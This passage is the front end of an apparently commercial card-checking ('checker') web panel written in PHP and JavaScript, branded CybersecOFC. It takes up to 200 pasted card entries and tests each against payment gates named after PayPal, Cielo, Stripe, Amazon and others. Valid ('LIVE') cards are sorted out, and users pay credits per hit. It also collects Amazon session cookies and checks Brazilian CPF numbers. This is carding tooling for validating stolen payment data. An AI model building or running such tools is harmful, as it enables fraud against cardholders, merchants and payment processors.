                margin-top: 20px;
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <?php if ($userType === 'credits'): ?>
    <div class="credits-counter" id="creditsCounter">
        💳 Créditos: <span id="currentCredits"><?php echo number_format($userCredits, 2); ?></span>
    </div>
    <?php endif; ?>

    <div class="container">
        <div class="header">
            <h1><?php echo $toolName; ?></h1>
            <p>Sistema de Verificação</p>
            <div class="user-info">
                👤 <?php echo $_SESSION['username']; ?>
                <?php if ($userType === 'temporary'): ?>
                    <br><span style="color: var(--neon-yellow);">⏱️ TEMPORÁRIO</span>
                <?php elseif ($userType === 'credits'): ?>
                    <br><span style="color: var(--neon-purple);">💰 CRÉDITOS</span>
                <?php endif; ?>
            </div>
        </div>

        <?php if ($userType === 'temporary'): ?>
            <div class="time-left" id="timeLeft"><?php echo $timeLeftText; ?></div>
        <?php elseif ($userType === 'credits'): ?>
            <div class="credits-info" id="creditsInfo"><?php echo $creditsText; ?></div>
        <?php endif; ?>

        <div class="nav-buttons">
            <a href="index.php" class="btn btn-primary">← Voltar ao Menu</a>
            <?php if ($_SESSION['role'] === 'admin'): ?>
                <a href="?admin=true" class="btn btn-primary">⚙ Painel Admin</a>
            <?php endif; ?>
            <a href="?logout" class="btn btn-danger">🚪 Sair</a>
        </div>

        <div class="info-box">
            <h3>📖 Como Usar</h3>
            <ul>
                <?php foreach ($howToUse as $step): ?>
                    <li><?php echo $step; ?></li>
                <?php endforeach; ?>
                <?php if ($userType === 'credits'): ?>
                    <li><strong>💡 LIVE: 1.50 créditos | DIE: 0.05 créditos</strong></li>
                <?php endif; ?>
                <li><strong>⏱️ Delay automático de 4 segundos entre cada verificação</strong></li>
                <li><strong>📊 Máximo de 200 cartões por verificação</strong></li>
            </ul>
        </div>

        <div class="example-section">
            <h3>💡 Exemplo de Formato</h3>
            <div class="example-box">
                <pre><?php echo htmlspecialchars($inputExample); ?></pre>
            </div>
        </div>

        <?php if ($isAmazonChecker): ?>
        <div class="input-section">
            <h3>🔐 Cookies da Amazon</h3>
            <textarea id="amazonCookies" placeholder="Cole aqui os cookies da amazon.com..." style="height: 100px;"></textarea>
        </div>
        <?php endif; ?>

        <div class="input-section">
            <h3><?php echo $inputLabel; ?></h3>
            <textarea id="dataInput" placeholder="<?php echo $placeholder; ?>"></textarea>
        </div>

        <div class="remaining-items" id="remainingItems">
            📊 Itens restantes para processar: <span id="remainingCount">0</span>
        </div>

        <div class="controls">
            <button class="btn btn-start" onclick="startCheck()">▶ Iniciar</button>
            <button class="btn btn-stop" onclick="stopCheck()">⏹ Parar</button>
            <button class="btn btn-clear" onclick="clearAll()">🗑 Limpar</button>
            <div class="loading" id="loading">⏳ Processando... (Aguarde 4 segundos entre cada verificação)</div>
        </div>

        <div class="stats">
            <div class="stat-item">
                <div class="stat-label">Total</div>
                <div class="stat-value" id="totalCount">0</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">✅ Aprovados</div>
                <div class="stat-value" id="liveCount" style="color: var(--neon-green);">0</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">❌ Reprovados</div>
                <div class="stat-value" id="dieCount" style="color: #ff0000;">0</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">⚡ Processados</div>
                <div class="stat-value" id="processedCount" style="color: var(--neon-blue);">0</div>
            </div>
        </div>

        <div class="results-container">
            <div class="result-box live-box">
                <h3>✅ APROVADOS</h3>
                <div id="liveResults"></div>
            </div>
            <div class="result-box die-box">
                <h3>❌ REPROVADOS</h3>
                <div id="dieResults"></div>
            </div>
        </div>
    </div>

    <script>
        let isChecking = false;
        let currentIndex = 0;
        let items = [];
        const toolName = '<?php echo $selectedTool; ?>';
        const userType = '<?php echo $userType; ?>';
        let currentCredits = <?php echo $userCredits; ?>;
        const MAX_ITEMS = 200;

        function checkIfLive(response) {
            if (!response || typeof response !== 'string') return false;

            const livePatterns = [
                'Aprovada', 'aprovada', 'APROVADA', 
                'success', 'SUCCESS', 'Success',
                '✅', '✓', '✔', '🟢',
                'Live', 'LIVE', 'live',
                'AUTHORIZED', 'Authorized', 'authorized',
                'Válido', 'válido', 'VÁLIDO',
                'Válida', 'válida', 'VÁLIDA',
                'Valid', 'VALID',
                'Aprovado', 'aprovado', 'APROVADO',
                'ok', 'OK', 'Ok',
                'Encontrado', 'encontrado', 'ENCONTRADO'
            ];

            for (const pattern of livePatterns) {
                if (response.toLowerCase().includes(pattern.toLowerCase())) {
                    return true;
                }
            }

            return false;
        }

        <?php if ($userType === 'temporary'): ?>
        setInterval(function() {
            const expiresAt = <?php echo $userData['expires_at'] ?? time(); ?>;
            const now = Math.floor(Date.now() / 1000);
            const timeLeft = expiresAt - now;

            if (timeLeft <= 0) {
                alert('⏱️ Seu tempo de acesso expirou! Você será desconectado.');
                window.location.href = '?logout';
            } else {
                const hoursLeft = Math.floor(timeLeft / 3600);
                const minutesLeft = Math.floor((timeLeft % 3600) / 60);
                document.getElementById('timeLeft').textContent = `⏱️ Tempo restante: ${hoursLeft}h ${minutesLeft}min`;
            }
        }, 60000);
        <?php endif; ?>

        function updateCreditsDisplay() {
            if (userType === 'credits') {
                document.getElementById('currentCredits').textContent = currentCredits.toFixed(2);
                document.getElementById('creditsInfo').textContent = `💳 Créditos disponíveis: ${currentCredits.toFixed(2)} (LIVE: 1.50 | DIE: 0.05)`;

                if (currentCredits < 0.05) {
                    document.querySelector('.btn-start').disabled = true;
                    document.querySelector('.btn-start').style.opacity = '0.5';
                    document.querySelector('.btn-start').style.cursor = 'not-allowed';
                    document.querySelector('.btn-start').textContent = '💳 Créditos Insuficientes';
                }
            }
        }

        function updateRemainingItems() {
            const remaining = items.length - currentIndex;
            document.getElementById('remainingCount').textContent = remaining;
            if (remaining > 0) {
                document.getElementById('remainingItems').classList.add('active');
            } else {
                document.getElementById('remainingItems').classList.remove('active');
            }
        }

        function startCheck() {
            const input = document.getElementById('dataInput').value.trim();
            if (!input) {
                alert('Por favor, insira os dados!');
                return;
            }

            <?php if ($isAmazonChecker): ?>
            const cookies = document.getElementById('amazonCookies').value.trim();
            if (!cookies) {
                alert('Por favor, insira os cookies da Amazon!');
                return;
            }
            window.amazonCookies = cookies;
            <?php endif; ?>

            if (userType === 'credits' && currentCredits < 0.05) {
                alert('💳 Créditos insuficientes! Você precisa de pelo menos 0.05 créditos para iniciar uma verificação.');
                return;
            }

            items = input.split('\n').filter(line => line.trim());

            if (items.length > MAX_ITEMS) {
                alert(`⚠️ MÁXIMO ${MAX_ITEMS} ITENS POR VEZ! Foram selecionados apenas os primeiros ${MAX_ITEMS} itens.`);
                items = items.slice(0, MAX_ITEMS);
                document.getElementById('dataInput').value = items.join('\n');
            }

            if (items.length === 0) {
                alert('Nenhum dado válido encontrado!');
                return;
            }

            currentIndex = 0;
            isChecking = true;
            document.getElementById('loading').classList.add('active');
            document.getElementById('totalCount').textContent = items.length;
            updateRemainingItems();

            processNextItem();
        }

        function stopCheck() {
            isChecking = false;
            document.getElementById('loading').classList.remove('active');
            document.getElementById('remainingItems').classList.remove('active');
        }

        function clearAll() {
            document.getElementById('dataInput').value = '';
            <?php if ($isAmazonChecker): ?>document.getElementById('amazonCookies').value = '';<?php endif; ?>
            document.getElementById('liveResults').innerHTML = '';
            document.getElementById('dieResults').innerHTML = '';
            document.getElementById('totalCount').textContent = '0';
            document.getElementById('liveCount').textContent = '0';
            document.getElementById('dieCount').textContent = '0';
            document.getElementById('processedCount').textContent = '0';
            isChecking = false;
            currentIndex = 0;
            items = [];
            document.getElementById('loading').classList.remove('active');
            document.getElementById('remainingItems').classList.remove('active');
        }

        async function processNextItem() {
            if (!isChecking || currentIndex >= items.length) {
                stopCheck();
                return;
            }

            const item = items[currentIndex];

            try {
                let url = `?action=check&tool=${toolName}&lista=${encodeURIComponent(item)}`;
                <?php if ($isAmazonChecker): ?>
                if (window.amazonCookies) {
                    url += `&cookie=${encodeURIComponent(window.amazonCookies)}`;
                }
                <?php endif; ?>

                const response = await fetch(url);
                const text = await response.text();

                if (text.includes('pornolandia.xxx') || text.includes('cybersecofc')) {
                    if (text.includes('error') && text.includes('message') && text.includes('pornolandia.xxx')) {
                        alert('⚠️ Sistema de segurança ativado! Verificação interrompida.');
                        stopCheck();
                        return;
                    }
                }

                const isLive = checkIfLive(text);

                if (userType === 'credits') {
                    const cost = isLive ? 1.50 : 0.05;
                    currentCredits -= cost;
                    if (currentCredits < 0) currentCredits = 0;
                    updateCreditsDisplay();

                    if (currentCredits <= 0) {
                        setTimeout(() => {
                            alert('💳 Créditos esgotados! Você será desconectado.');
                            window.location.href = '?logout';
                        }, 1000);
                    }
                }

                addResult(item, text, isLive);

                items[currentIndex] = '';
                updateRemainingItems();

            } catch (error) {
                console.error('Error:', error);
                addResult(item, 'Erro: ' + error.message, false);

                items[currentIndex] = '';
                updateRemainingItems();
            }

            currentIndex++;
            document.getElementById('processedCount').textContent = currentIndex;

            if (isChecking && currentIndex < items.length) {
                setTimeout(processNextItem, 4000);
            } else {
                stopCheck();
            }
        }

        function addResult(item, response, isLive) {
            const container = isLive ? 
                document.getElementById('liveResults') : 
                document.getElementById('dieResults');

            const resultDiv = document.createElement('div');
            resultDiv.className = `result-item ${isLive ? 'live' : 'die'}`;
            resultDiv.innerHTML = response;

            container.insertBefore(resultDiv, container.firstChild);

            if (isLive) {
                const liveCount = parseInt(document.getElementById('liveCount').textContent);
                document.getElementById('liveCount').textContent = liveCount + 1;
            } else {
                const dieCount = parseInt(document.getElementById('dieCount').textContent);
                document.getElementById('dieCount').textContent = dieCount + 1;
            }
        }

        updateCreditsDisplay();
    </script>
</body>
</html>
<?php
exit;
}

// ============================================
// MENU PRINCIPAL
// ============================================

$availableTools = $_SESSION['tools'];

// Carregar dados atualizados do usuário
$users = loadUsers();
$userData = $users[$_SESSION['username']] ?? [];
$userCredits = $userData['credits'] ?? 0;
$userType = $userData['type'] ?? 'permanent';

$timeLeftText = '';
$creditsText = '';

if ($userType === 'temporary') {
    $timeLeft = $userData['expires_at'] - time();
    $hoursLeft = floor($timeLeft / 3600);
    $minutesLeft = floor(($timeLeft % 3600) / 60);
    $timeLeftText = "⏱️ Tempo restante: {$hoursLeft}h {$minutesLeft}min";
} elseif ($userType === 'credits') {
    $creditsText = "💳 Créditos disponíveis: " . number_format($userCredits, 2);
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menu Principal - CybersecOFC</title>
    <?php echo $music_embed; ?>
    <?php echo $security_script; ?>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');

        :root {
            --neon-green: #00ff00;
            --neon-blue: #00ffff;
            --neon-purple: #ff00ff;
            --neon-yellow: #ffff00;
            --dark-bg: #0a0a0f;
            --darker-bg: #05050a;
            --card-bg: rgba(10, 20, 30, 0.9);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 0, 0.1) 0%, transparent 20%),
                linear-gradient(45deg, transparent 49%, rgba(0, 255, 0, 0.03) 50%, transparent 51%),
                linear-gradient(135deg, transparent 49%, rgba(0, 255, 255, 0.03) 50%, transparent 51%);
            background-size: 100% 100%, 100% 100%, 100% 100%, 50px 50px, 50px 50px;
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(
                    0deg,
                    rgba(0, 255, 0, 0.03) 0px,
                    rgba(0, 255, 0, 0.03) 1px,
                    transparent 1px,
                    transparent 2px
                );
            pointer-events: none;
            z-index: 1;
            animation: flicker 3s infinite;
        }

        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, 
                transparent, 
                var(--neon-green),
                var(--neon-blue),
                var(--neon-purple),
                var(--neon-green),
                transparent
            );
            animation: scanline 3s linear infinite;
            z-index: 2;
            pointer-events: none;
            filter: blur(1px);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 10;
        }

        .header {
            text-align: center;
            margin-bottom: 50px;
            padding: 40px;
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 25px;
            box-shadow: 
                0 0 60px rgba(0, 255, 0, 0.3),
                inset 0 0 60px rgba(0, 255, 0, 0.1);
            backdrop-filter: blur(15px);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, 
                var(--neon-green), 
                var(--neon-blue), 
                var(--neon-purple), 
                var(--neon-yellow),
                var(--neon-green)
            );
            z-index: -1;
            border-radius: 27px;
            animation: rotate 10s linear infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 64px;
            background: linear-gradient(45deg, 
                var(--neon-green) 0%, 
                var(--neon-blue) 25%, 
                var(--neon-purple) 50%, 
                var(--neon-yellow) 75%, 
                var(--neon-green) 100%
            );
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            background-size: 200% 100%;
            animation: gradient 5s linear infinite;
            margin-bottom: 20px;
            text-shadow: 0 0 30px rgba(0, 255, 0, 0.5);
            letter-spacing: 5px;
            font-weight: 900;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            100% { background-position: 200% 50%; }
        }

        .header p {
            color: var(--neon-blue);
            font-size: 18px;
            letter-spacing: 3px;
            text-transform: uppercase;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .user-info {
            position: absolute;
            top: 20px;
            right: 20px;
            color: var(--neon-blue);
            font-size: 16px;
            text-align: right;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 20px;
            border-radius: 10px;
            border: 1px solid var(--neon-blue);
            backdrop-filter: blur(5px);
        }

        .status-info {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin: 30px 0;
            flex-wrap: wrap;
        }

        .status-item {
            padding: 20px 40px;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            min-width: 300px;
            backdrop-filter: blur(10px);
            animation: pulse 2s infinite;
            border: 2px solid;
            transition: all 0.3s;
        }

        .status-item:hover {
            transform: scale(1.05);
            box-shadow: 0 0 30px;
        }

        .time-left {
            color: var(--neon-yellow);
            border-color: var(--neon-yellow);
            background: rgba(255, 255, 0, 0.1);
            box-shadow: 0 0 20px rgba(255, 255, 0, 0.3);
        }

        .credits-info {
            color: var(--neon-purple);
            border-color: var(--neon-purple);
            background: rgba(255, 0, 255, 0.1);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
        }

        .nav-buttons {
            display: flex;
            gap: 20px;
            margin-bottom: 40px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .btn {
            padding: 18px 40px;
            border: 2px solid;
            background: rgba(0, 0, 0, 0.8);
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            font-size: 16px;
            border-radius: 15px;
            transition: all 0.3s;
            font-weight: bold;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 2px;
            position: relative;
            overflow: hidden;
            min-width: 200px;
            text-align: center;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn-admin {
            color: var(--neon-blue);
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }

        .btn-admin:hover {
            background: var(--neon-blue);
            color: #000;
            box-shadow: 0 0 40px var(--neon-blue);
            transform: translateY(-5px);
        }

        .btn-logout {
            color: var(--neon-purple);
            border-color: var(--neon-purple);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
        }

        .btn-logout:hover {
            background: var(--neon-purple);
            color: #fff;
            box-shadow: 0 0 40px var(--neon-purple);
            transform: translateY(-5px);
        }

        .tools-section {
            margin-bottom: 60px;
        }

        .tools-section h2 {
            color: var(--neon-blue);
            font-family: 'Orbitron', sans-serif;
            font-size: 32px;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 3px solid var(--neon-green);
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 20px var(--neon-blue);
        }

        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 30px;
        }

        .tool-card {
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 20px;
            padding: 30px;
            transition: all 0.3s;
            cursor: pointer;
            text-decoration: none;
            color: var(--neon-green);
            display: block;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
            height: 100%;
        }

        .tool-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, 
                var(--neon-green), 
                var(--neon-blue), 
                var(--neon-purple)
            );
            transform: translateX(-100%);
            transition: transform 0.5s;
        }

        .tool-card:hover::before {
            transform: translateX(0);
        }

        .tool-card:hover {
            background: rgba(0, 255, 0, 0.1);
            border-color: var(--neon-blue);
            transform: translateY(-10px) scale(1.02);
            box-shadow: 
                0 15px 40px rgba(0, 255, 0, 0.3),
                inset 0 0 30px rgba(0, 255, 255, 0.1);
        }

        .tool-icon {
            font-size: 48px;
            margin-bottom: 20px;
            text-align: center;
            filter: drop-shadow(0 0 10px currentColor);
        }

        .tool-card h3 {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            margin-bottom: 15px;
            color: var(--neon-blue);
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .tool-card p {
            font-size: 14px;
            color: rgba(0, 255, 0, 0.8);
            line-height: 1.8;
            text-align: center;
            margin-bottom: 20px;
        }

        .access-type {
            position: fixed;
            bottom: 30px;
            left: 30px;
            background: rgba(0, 0, 0, 0.9);
            padding: 15px 30px;
            border-radius: 15px;
            font-weight: bold;
            z-index: 1000;
            border: 2px solid;
            backdrop-filter: blur(10px);
            font-family: 'Orbitron', sans-serif;
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
            box-shadow: 0 0 20px;
        }

        .access-type.permanent {
            color: var(--neon-green);
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }

        .access-type.temporary {
            color: var(--neon-yellow);
            border-color: var(--neon-yellow);
            box-shadow: 0 0 20px rgba(255, 255, 0, 0.5);
        }

        .access-type.credits {
            color: var(--neon-purple);
            border-color: var(--neon-purple);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
        }

        @media (max-width: 1200px) {
            .tools-grid {
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            }
        }

        @media (max-width: 768px) {
            .header h1 {
                font-size: 36px;
            }

            .status-item {
                min-width: 100%;
            }

            .tools-grid {
                grid-template-columns: 1fr;
            }

            .nav-buttons {
                flex-direction: column;
            }

            .btn {
                min-width: 100%;
            }

            .access-type {
                position: static;
                margin-top: 30px;
                width: 100%;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="scanline"></div>

    <div class="access-type <?php echo $userType; ?>">
        <?php 
        if ($userType === 'permanent') {
            echo '♾️ ACESSO PERMANENTE';
        } elseif ($userType === 'temporary') {
            echo '⏱️ ACESSO TEMPORÁRIO';
        } elseif ($userType === 'credits') {
            echo '💰 ACESSO POR CRÉDITOS: ' . number_format($userCredits, 2) . ' créditos';
        }
        ?>
    </div>

    <div class="container">
        <div class="header">
            <h1>CYBERSECOFC APIS</h1>
            <p>SISTEMA PREMIUM DE CHECKERS</p>
            <div class="user-info">
                👤 <?php echo $_SESSION['username']; ?>
                <?php if ($_SESSION['role'] === 'admin'): ?>
                    <br><span style="color: var(--neon-yellow);">⭐ ADMINISTRADOR</span>
                <?php elseif ($userType === 'temporary'): ?>
                    <br><span style="color: var(--neon-yellow);">⏱️ TEMPORÁRIO</span>
                <?php elseif ($userType === 'credits'): ?>
                    <br><span style="color: var(--neon-purple);">💰 CRÉDITOS</span>
                <?php endif; ?>
            </div>
        </div>

        <div class="status-info">
            <?php if ($userType === 'temporary'): ?>
                <div class="status-item time-left" id="timeLeft"><?php echo $timeLeftText; ?></div>
            <?php elseif ($userType === 'credits'): ?>
                <div class="status-item credits-info" id="creditsInfo"><?php echo $creditsText; ?></div>
            <?php endif; ?>
        </div>

        <div class="nav-buttons">
            <?php if ($_SESSION['role'] === 'admin'): ?>
                <a href="?admin=true" class="btn btn-admin">⚙ PAINEL ADMINISTRATIVO</a>
            <?php endif; ?>
            <a href="?logout" class="btn btn-logout">🚪 SAIR DO SISTEMA</a>
        </div>

        <div class="tools-section">
            <h2>💳 CHECKERS DISPONÍVEIS</h2>
            <div class="tools-grid">
                <?php
                $toolDetails = [
                    'paypal' => ['icon' => '💰', 'name' => 'PayPal V2', 'desc' => 'Verificação completa de cartões via PayPal'],
                    'preauth' => ['icon' => '🔐', 'name' => 'cielo', 'desc' => 'Gate cielo'],
                    'n7' => ['icon' => '⚡', 'name' => 'PAGARME', 'desc' => 'Checker SAINDO MASTER-VISA-AMEX'],
                    'amazon1' => ['icon' => '📦', 'name' => 'Amazon Prime', 'desc' => 'Verifica cartões via Amazon Prime US'],
                    'amazon2' => ['icon' => '🛒', 'name' => 'Amazon UK', 'desc' => 'Verifica cartões via Amazon UK'],
                    'cpfchecker' => ['icon' => '🔍', 'name' => 'CPF Checker', 'desc' => 'Verificação de CPF completa'],
                    'ggsitau' => ['icon' => '🏦', 'name' => 'GGs ITAU', 'desc' => 'APENAS RETONOS MASTER-VISA'],
                    'getnet' => ['icon' => '💳', 'name' => 'GETNET', 'desc' => 'Verificação GETNET'],
                    'auth' => ['icon' => '🔒', 'name' => 'AUTH', 'desc' => 'Sistema de autorização'],
                    'debitando' => ['icon' => '💸', 'name' => 'DEBITANDO', 'desc' => 'Verificação de débito'],
                    'n7_new' => ['icon' => '⚡', 'name' => 'N7', 'desc' => 'Checker N7'],
                    'gringa' => ['icon' => '🌎', 'name' => 'GRINGA', 'desc' => 'Checker internacional'],
                    'elo' => ['icon' => '💎', 'name' => 'ELO', 'desc' => 'Verificação ELO'],
                    'erede' => ['icon' => '🔄', 'name' => 'EREDE', 'desc' => 'Sistema EREDE'],
                    'allbins' => ['icon' => '📊', 'name' => 'ALLBINS', 'desc' => 'Verificação múltipla'],
                    'stripe' => ['icon' => '💳', 'name' => 'STRIPE', 'desc' => 'Checker Stripe'],
                    'visamaster' => ['icon' => '💳', 'name' => 'VISA/MASTER', 'desc' => 'Verificação direta']
                ];

                foreach ($availableTools as $tool):
                    if (isset($toolDetails[$tool])):
                        $details = $toolDetails[$tool];
                ?>
                <a href="?tool=<?php echo $tool; ?>" class="tool-card">
                    <div class="tool-icon"><?php echo $details['icon']; ?></div>
                    <h3><?php echo $details['name']; ?></h3>
                    <p><?php echo $details['desc']; ?></p>
                </a>
                <?php
                    endif;
                endforeach;
                ?>
            </div>
        </div>
    </div>

    <script>
        <?php if ($userType === 'temporary'): ?>
        setInterval(function() {
            const expiresAt = <?php echo $userData['expires_at'] ?? time(); ?>;
            const now = Math.floor(Date.now() / 1000);
            const timeLeft = expiresAt - now;

            if (timeLeft <= 0) {
                alert('⏱️ Seu tempo de acesso expirou! Você será desconectado.');
                window.location.href = '?logout';
            } else {
                const hoursLeft = Math.floor(timeLeft / 3600);
                const minutesLeft = Math.floor((timeLeft % 3600) / 60);
                document.getElementById('timeLeft').textContent = `⏱️ Tempo restante: ${hoursLeft}h ${minutesLeft}min`;
            }
        }, 60000);
        <?php endif; ?>
    </script>
</body>
</html>

